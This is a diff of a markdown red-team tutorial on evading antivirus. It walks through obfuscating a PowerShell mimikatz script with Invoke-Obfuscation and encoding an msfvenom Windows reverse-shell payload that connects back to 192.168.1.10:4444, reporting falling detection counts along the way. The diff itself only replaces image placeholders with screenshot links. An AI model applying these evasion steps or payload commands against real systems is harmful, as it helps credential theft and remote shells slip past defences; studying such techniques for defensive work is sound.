@@ -7,7 +7,7 @@ https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source
 
 If you downloaded the previous powershell version and run it against any antivirus solution, it will mark it as a malicious file.
 
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/MindMap.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen1.png?raw=true)
 
 Now we need to make the previous powershell file to be undetectable by most of the antivirus solutions and to do that we need to change its signature so no one of the antiviruses identifies it.
 
@@ -44,7 +44,7 @@ Import-Module ./Invoke-Obfuscation.psd1
 Invoke-Obfuscation
 ```
 
-<PIC2>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen2.png?raw=true)
 
 Enter the script you want to obfuscate inside the tool.
 ```
@@ -53,66 +53,66 @@ set ScriptPath c:/Users/Test/mimikatz.ps1
 
 Choose the token option, this option lets us change a lot of things inside powershell code.
 
-<PIC3>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen3.png?raw=true)
 
 You can now change anything inside the code based on the following options as we illustrated previously.
 
-<PIC4>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen4.png?raw=true)
 
 Now we removed all the comments inside the code and save it.
 
-<PIC5>
-<PIC6>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen5.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen6.png?raw=true)
 
 The antiviruses catch this file decreased from 32 to 30.
 
 Now we will obfuscate all the strings inside the file.
 
-<PIC7>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen7.png?raw=true)
 
 Obfuscate the strings another round.
 
-<PIC8>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen8.png?raw=true)
 
 Antiviruses decreased to 25.
 
-<PIC9>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen9.png?raw=true)
 
 Change the variables.
 
-<PIC10>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen10.png?raw=true)
 
 Antiviruses decreased to 18.
 
-<PIC11>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen11.png?raw=true)
 
 You need to verify that the file is working as intended after every change inside the file.
 
-<PIC12>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen12.png?raw=true)
 
 The file is working fine, and the antivirus number became 18 from 32.
 
 Now we will change the arguments, members, and commands.
 
-<PIC13>
-<PIC14>
-<PIC15>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen13.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen14.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen15.png?raw=true)
 
 Now the powershell version of mimikatz is undetectable from all the antivirus solutions.
 
-<PIC16>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen16.png?raw=true)
 
 Save the file and try to run it.
 
-<PIC17>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen17.png?raw=true)
 
 Simple comparison between the powershell code before and after the obfuscation, this is what makes the file undetectable by the antivirus.
 
-<PIC18>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen18.png?raw=true)
 
 Virus total comparison before and after the obfuscation.
 
-<PIC19>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen19.png?raw=true)
 
 Summary of all the commands used.
 ```
@@ -173,7 +173,7 @@ Now we will work on how we can make a Metasploit payload undetectable by most of
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw exitfunc=thread > test1.exe
 ```
 
-<PIC20>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen20.png?raw=true)
 
 A lot of antiviruses mark it as malicious.
 
@@ -216,11 +216,11 @@ Pass the metasploit payload through pipe to the python code to perform the encod
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw exitfunc=thread | python encoder.py 
 ```
 
-<PIC21>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen21.png?raw=true)
 
 Test this raw payload on virus total.
 
-<PIC22>
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen22.png?raw=true)
 
 No antivirus identifies it, but to make things clear here, until now we are working with a raw payload which is only the shellcode, not a full working executable file.
 
@@ -408,6 +408,8 @@ strip --strip-all main64.exe
 ```
 
 Lastly, run the file to validate that it's working properly.
-<PIC23>
-<PIC24>
+
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen23.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/DefenseEvasion/Screen24.png?raw=true)
+
 The result is almost good where this file not detected by most of the antivirus solutions and just detected by 5 from more than 70 antiviruses.
